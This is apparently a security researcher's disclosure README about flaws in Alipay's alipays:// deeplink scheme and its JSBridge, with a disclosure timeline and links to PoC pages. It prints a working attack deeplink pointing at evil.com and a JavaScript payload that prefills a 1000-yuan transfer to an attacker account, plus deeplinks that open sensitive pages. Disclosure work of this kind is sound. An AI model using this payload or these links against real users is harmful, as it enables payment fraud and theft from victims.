

## Attack Chain A: JSBridge Exploitation（JSBridge 利用攻击链）
**DeepLink URL:**
```
alipays://platformapi/startapp?appId=20000067&url=https://evil.com/poc.html
```

**攻击流程:**
1. 受害者点击恶意链接
2. 支付宝 WebView 加载外部页面 (https://evil.com/poc.html)
3. 自动注入 AlipayJSBridge 接口
4. 执行 JavaScript Payload:
```javascript
AlipayJSBridge.call('startApp', {
  appId: '20000116',
  params: {
    uid: 'attacker@evil.com',
    amount: '1000',
    memo: '安全验证'
  }
});
```
5. 打开转账页面，预填攻击者账号和 1000 元金额
6. 显示假转账通知诱导用户确认

## Attack Chain B: Zero-Interaction DeepLinks（零交互 DeepLink 攻击链）

可直接唤起敏感页面的 DeepLink 列表：

| 功能 | appId | DeepLink |
|------|-------|----------|
| **交易记录** | 20000003 | `alipays://platformapi/startapp?appId=20000003` |
| **转账联系人** | 20000116 | `alipays://platformapi/startapp?appId=20000116` |
| **收款码** | 20000123 | `alipays://platformapi/startapp?appId=20000123` |
| **余额宝余额** | 20000032 | `alipays://platformapi/startapp?appId=20000032` |
| **安全设置** | 20000052 | `alipays://platformapi/startapp?appId=20000052` |
| **银行卡管理** | 20000193 | `alipays://platformapi/startapp?appId=20000193` |

## 受影响版本
- Android: com.eg.android.AlipayGphone v10.8.26.7000 / v10.8.30.8000
- iOS: 26.3.1

## 核心风险点
1. **alipays:// scheme** 可被任意应用或网页调用
2. **JSBridge API** 未做来源验证，允许危险操作（启动应用、获取设备信息、UI 欺骗）
3. **零交互攻击** 无需用户额外权限即可访问敏感功能
**17 Verified Vulnerabilities | 3 Devices | 308 Server Log Entries**

## Full Report

- **Website**: [https://innora.ai/zfb/](https://innora.ai/zfb/)
- **GitHub Mirror**: This repository

## Summary

This repository documents a comprehensive security research project that uncovered **17 security vulnerabilities** in Alipay's DeepLink URI scheme (`alipays://`) and its Nebula WebView container.

### Key Findings

| Severity | Count | Examples |
|----------|-------|---------|
| **CRITICAL** | 3 | GPS silent theft, Transfer pre-fill, Payment initiation |
| **HIGH** | 6 | Device fingerprinting, UI spoofing, Session leak |
| **MEDIUM** | 8 | Network info, Chain WebView, Scheme injection |

### Attack Chain

```
External SMS/QQ/WeChat Link
    → Browser opens alipays:// DeepLink
    → Alipay launches with attacker's URL in WebView
    → AlipayJSBridge APIs exposed to external page
    → Silent data collection (GPS, device info, session)
    → UI spoofing (title bar, toast notifications)
    → Sensitive page navigation (transaction history, transfer)
```

### Cross-Platform Verification

- Samsung Galaxy S25 Ultra (Android 15, New Zealand)
- Redmi 12 (Android 14, Malaysia)
- iPhone 16 Pro (iOS 18.3, China)

## Live PoC (Read-Only Demo)

> **No data is collected or transmitted.** All results display locally only.

- [Trigger Page](https://innora.ai/zfb/poc/trigger.html) — Simulates attacker distribution page
- [JSBridge PoC](https://innora.ai/zfb/poc/verify.html) — Demonstrates API access from external page
- [Chain WebView](https://innora.ai/zfb/poc/chain.html) — Proves chained pages retain bridge access

## Responsible Disclosure Timeline

| Date | Action |
|------|--------|
| 2026-02-25 | Initial report sent to Ant Group SRC (TLS/SSL findings) |
| 2026-03-07 | Full report V3 sent with 17 vulnerabilities + 308 log entries |
| 2026-03-10 | Ant Group response: "These are normal features" (正常功能) |
| 2026-03-11 | Public disclosure after vendor declined to acknowledge |

## Repository Structure

```
├── index.html          # Full bilingual (CN/EN) research blog
├── poc/
│   ├── trigger.html    # Attack trigger simulation page
│   ├── verify.html     # JSBridge exploitation PoC
│   └── chain.html      # Chain WebView demonstration
├── review_kimi.md      # Kimi K2 cross-validation review
├── review_sonnet.md    # Sonnet review
├── review_summary.md   # Review summary
└── README.md           # This file
```

## Evidence

- **308 server exfiltration log entries** (JSONL format, not included in public repo)
- **42 real-device screenshots** (not included in public repo)
- Full evidence available upon request: feng@innora.ai

## Legal Disclaimer

This research is conducted for **educational and security improvement purposes only**. All testing was performed on accounts owned by the researcher. No unauthorized access to third-party accounts or data occurred.

The PoC pages are **read-only demonstrations** with all data exfiltration endpoints disabled. They only display results locally in the browser.

## Mirrors & Archives

To prevent single-point deletion, this research is archived at multiple locations:

- **Website**: [https://innora.ai/zfb/](https://innora.ai/zfb/)
- **GitHub**: [https://github.com/sgInnora/alipay-deeplink-research](https://github.com/sgInnora/alipay-deeplink-research)

If any mirror is taken down, please check the other locations.

**Readers are encouraged to fork this repository as backup.**

## Contact

- **Researcher**: Innora AI Security Research Team
- **Email**: feng@innora.ai
- **Website**: [innora.ai](https://innora.ai)

---

*This research follows responsible disclosure practices. The vendor was given adequate time to respond before public disclosure.*
